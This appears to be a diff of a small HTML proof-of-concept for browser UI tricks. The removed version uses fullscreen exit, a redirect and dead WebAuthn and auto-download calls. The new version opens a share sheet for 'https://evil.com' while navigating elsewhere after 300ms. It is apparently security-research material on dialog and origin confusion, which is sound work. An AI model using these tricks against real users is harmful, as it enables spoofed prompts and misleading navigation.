@@ -1,57 +1,19 @@
-<!DOCTYPE html>
-<html>
-<body style="background:#111; color:#fff; text-align:center; font-family:sans-serif;">
-
-<h2>SUPER PoC - Auto Redirect After ESC</h2>
-<button id="start" style="font-size:22px; padding:12px 24px;">Start</button>
+<!doctype html>
+<button id="b">Share</button>
 
 <script>
-// Enter fullscreen
-async function goFullscreen() {
-    try {
-        await document.body.requestFullscreen();
-    } catch (e) {}
-}
+document.getElementById('b').onclick = async () => {
+  if (!navigator.share) return;
 
-document.getElementById("start").onclick = goFullscreen;
+  // Trigger navigation shortly after share is requested
+  setTimeout(() => {
+    location.href = 'https://search.brave.com';
+  }, 300);
 
-document.addEventListener("fullscreenchange", async () => {
-
-    if (document.fullscreenElement !== null) return;
-
-    // ===========================
-    //    REDIRECT + STOP CODE
-    // ===========================
-    window.location.href = "http://google.com";
-    return; // <--- PENTING! mencegah WebAuthn muncul
-    
-
-
-    // (kode di bawah TIDAK AKAN berjalan)
-    
-    async function test(name, fn) {
-        try { await fn(); } catch (e) {}
-    }
-
-    if (navigator.credentials)
-        await test("WebAuthn", () =>
-            navigator.credentials.get({
-                publicKey: {
-                    challenge: new Uint8Array(32),
-                    userVerification: "required"
-                }
-            })
-        );
-
-    await test("Auto Download", () => {
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(new Blob(["Hello"], { type: "text/plain" }));
-        a.download = "test.txt";
-        a.click();
-    });
-
-});
+  await navigator.share({
+    title: 'Test',
+    text: 'POC POC POC POC POC',
+    url: 'https://evil.com'
+  });
+};
 </script>
-
-</body>
-</html>
